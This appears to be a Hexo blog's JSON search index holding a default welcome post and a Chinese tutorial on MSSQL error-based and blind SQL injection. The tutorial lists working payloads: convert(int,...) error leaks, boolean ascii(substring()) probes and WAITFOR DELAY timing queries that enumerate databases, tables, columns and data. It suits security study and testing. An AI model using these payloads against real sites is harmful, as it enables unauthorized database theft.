[{"title":"Hello World","path":"/2024/07/02/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment"},{"title":"MSSQL 盲注和报错注入基础","path":"/2022/06/04/MSSQL 盲注和报错注入基础-hello-mssql/","content":"Mssql 盲注和报错注入Mssql 的基本库 sysaltfiles：主数据库 保存数据库的文件syscharsets：主数据库字符集与排序顺序sysconfigures：主数据库 配置选项syscurconfigs：主数据库当前配置选项sysdatabases：主数据库服务器中的数据库sslanguages：主数据库语言syslogins：主数据库 登陆帐号信息sysoledbusers：主数据库 链接服务器登陆信息sysprocesses：主数据库进程sysremotelogins主数据库 远程登录帐号syscolumns：每个数据库 列sysconstrains：每个数据库 限制sysfilegroups：每个数据库 文件组sysfiles：每个数据库 文件sysforeignkeys：每个数据库 外部关键字sysindexs：每个数据库 索引sysmenbers：每个数据库角色成员sysobjects：每个数据库所有数据库对象syscomments：数据库对象的详细资料syspermissio ns：每个数据库 权限systypes：每个数据库 用户定义数据类型sysusers：每个数据库 用户sys.tables ： 所有数据表 在着其中：sys.databases这张表中储存了SQLServer中所有的数据库的库名；sys.objects表中储存了SQLServer中所有的数据库的表名；sys.columns表中储存了SQLServer中所有的数据表的列名。 sql server 主要函数host_name() :返回服务器端主机名称。current_user()：返回当前数据库用户。db_name():返回当前数据库库名 。char():将ASCII码转化为对应的字符。ASCII():将字符转化为对应的ASCII码。substring():截取字符串。 Mssql 中用户权限 MSSQL 报错注入常用报错函数介绍convert()函数介绍：定义： convert() 函数是把日期转换为新数据类型的通用函数。用法： 对于 convert(int,@@version)，convert 函数⾸先会执⾏第⼆个参数指定的SQL查询，然后尝试将查询结果转换为int类型。但是，由于这个SQL查询的结果是varchar类型，⽆法进⾏指定的转换，所以，convert函数会抛出 ⼀个SQL server错误消息，指出“SQL查询结果”⽆法转换为“int”类型，这样的话，攻击者就能得到的这个SQL查询的结果了 quotename()函数介绍：定义： quotename() 函数默认在要处理的参数左右加上两个中括号，起到分隔符的作用，避免出现sql关键字异常。用法： quotename(name)，给查询出的多个表名、列名加入中括号，或者其他符号为分隔符，进行分割，可使SQL注入结果更清晰。 for xml path(’’)语句介绍：定义： 提供查询返回的结果为xml格式，此时返回的相当于一个字符串。用法： 将查询到的数据，通过xml进行显示，path指定xml元素结点（行节点），该语句可以将查询到的所有数据通过XML进行显示。 stuff()函数介绍：定义： stuff()函数将表中列的内容横向输出。用法： stuff(param1, startIndex, length, param2)，将param1中自startIndex(SQL中都是从1开始，而非0)起，删除length个字符，然后用param2替换删掉的字符 基本注入流程基本测试函数 convert(int,@@version) 获取版本信息convert(int,db_name()) 数据库名字convert(int,user) 当前⽤户名convert(int,@@SERVERNAME) 获取有关服务器主机的信息 判断数据库数量 CONVERT(int,(select name from master.dbo.sysdatabases where dbid&gt;4))&#x2F;&#x2F;查询所有数据库，Mssql中系统表中基本表，前四个是系统表，第五个开始为用户表。 当下数据库中的数据表 CONVERT(int,(select top 1 table_name from information_schema.columns))&#x2F;&#x2F;查询当前数据下的第一个数据表，top 1表示只显示查询的第一个结果。 查询数据表中的字段 convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME&#x3D;’stuinfo’)) convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME&#x3D;cast(0x737475696E666F as varchar)))&#x2F;&#x2F; 这个查询列，需要将表名16进制，网址http://www.txttool.com/t/?id=NDgy convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME&#x3D;cast(0x737475696E666F as varchar) and COLUMN_NAME !&#x3D; ‘sid’)))&#x2F;&#x2F; 在查询到第一个字段的时候，可以通过这个方法去查询第二个字段 查询数据表中的数据 convert(int,(select top 1 sid from stuinfo)) &#x2F;&#x2F;基本语句，列名就说字段名 这里由于sid的类型为int，并未报错 convert(int,(select top 1 列名 from 表名 where 列名!&#x3D;’saul’)) &#x2F;&#x2F;同样的方法，去继续查询 MSSQL 注入盲注(布尔)一般在无回显的情况下去进行盲注，注入语句都不能单独使用，要与前面一个可执行的语句衔接 注释：count(*)返回行数 先查看第一个用户表是否存在（dbid&#x3D;5），然后一直往后查询 and (select count(*) from master.dbo.sysdatabases where dbid&#x3D;5)&#x3D;1&#x2F;&#x2F;sysdatabases：主数据库服务器中的数据库，前四个为系统表从第五个开始为用户表 在用户表存在的情况下，就可以开始盲注了,首先判断数据库的长度 and (select count(*) from master.dbo.sysdatabases where dbid&#x3D;5 and len(name)&#x3D;4)&#x3D;1 猜解数据库注释：substring(str,start,len) 截取字符串的作用，第一个参数为要截取的字符串，第二个参数为从哪里开始截取，第三个参数为截取的长度。ascii(char) 把字符转换为ascii值，因为我们dbid5的数据库名是Sales，他的第一个字符S是ASCII码为83，我们就可以使用下面的语句来判断： and ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid &gt; 4),1,1)) &#x3D; 83and ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid&#x3D;5),1,1)) &#x3D; 83&#x2F;&#x2F;后面只需要递增substring的第二个参数就可以，猜解数据库名字 猜解当前数据库中的数据表的长度注释：where后面这个查询语句，是查询students数据库下的第一个表，将表名赋值给name and(select count(*) from students.dbo.sysobjects where name in (select top 1 name from students.dbo.sysobjects where xtype&#x3D;’u’) and len(name)&#x3D;7) 猜解数据库中数据表 and (select count(*) from students.dbo.sysobjects where name in (select top 1 name from students.dbo.sysobjects where xtype&#x3D;’u’) and ascii(substring(name,1,1))&#x3D;115)&#x3D;1 and ascii(substring((select top 1 name from students..sysobjects where xtype&#x3D;’U’ and name in (select top 1 name from students.sys.sysobjects where xtype&#x3D;’U’)),1,1))&#x3D;115 猜测数据表中的列 and ascii(substring((select top 1 name from syscolumns where id&#x3D;(select id from sysobjects where xtype&#x3D;0x75 and name&#x3D;’stuinfo’)),1,1)) &#x3D;115 查询列中的数据and ascii(substring((select top 1 sid from stuinfo),1,1)) &#x3D;115 MSSQL 注入盲注(延时)延时函数 WAITFOR DELAY WAITFOR是SQL Server中Transact-SQL提供的⼀个流程控制语句。它的作⽤就是等待特定时间，然后继续执⾏后 续的语句。它包含⼀个参数DELAY，⽤来指定等待的时间。 如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有延迟，渗透测试⼈员就可以判断⽹站是否存在注⼊漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测⽅法。 语法：WAITFOR DELAY ‘0:0:n’常见注入语法：IF exists() WAITFOR DELAY ‘0:0:5’ 猜测数据库长度 if ((select count(*) from master.dbo.sysdatabases where dbid&#x3D;5)&#x3D;1) waitfor delay ‘0:0:3’–&#x2F;&#x2F;判断用户数据库是否存在 if ((select count(*) from master.dbo.sysdatabases where dbid&#x3D;5 and len(name)&#x3D;4)&#x3D;1) waitfor delay ‘0:0:3’–&#x2F;&#x2F;判断数据库长度 根据dbid查询挨个查询数据库名 if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid&#x3D;5),1,1)) &#x3D; 115) WAITFOR DELAY ‘0:0:3’– 猜解表名 if ( (select count(*) from students.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype&#x3D;’u’) and len(name)&#x3D;5)&#x3D;1) WAITFOR DELAY ‘0:0:3’–&#x2F;&#x2F;猜解数据表长度 if ((select count(*) from students.dbo.sysobjects where name in (select top 1 name from students.dbo.sysobjects where xtype&#x3D;’u’) and ascii(substring(name,1,1))&#x3D;115)&#x3D;1) WAITFOR DELAY ‘0:0:3’–&#x2F;&#x2F;猜解表名 if ((select count(*) from students.dbo.sysobjects where name in (select top 1 name from students.dbo.sysobjects where xtype&#x3D;’u’ and name not in (‘stuinfo’)) and ascii(substring(name,1,1))&#x3D;115)&#x3D;1) WAITFOR DELAY ‘0:0:3’–&#x2F;&#x2F;使用not语句，去猜解第二个表的名字 猜解列名 if (exists(select top 1 name from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; ‘users’) and unicode(substring(name,1,1))&#x3D;115)) WAITFOR DELAY ‘0:0:3’–、&#x2F;&#x2F;方法一 if (ascii(substring((select top 1 name from syscolumns where id&#x3D;(select id from sysobjects where xtype&#x3D;0x75 and name&#x3D;’users’)),1,1)) &#x3D;115) WAITFOR DELAY ‘0:0:3’–&#x2F;&#x2F;方法二，0x75就是u 在知道表名何列名的情况下，去爆数据 if (ascii(substring((select top 1 sid from stuinfo),1,1)) &#x3D; 115) WAITFOR DELAY ‘0:0:3’–","categories":["sql"]}]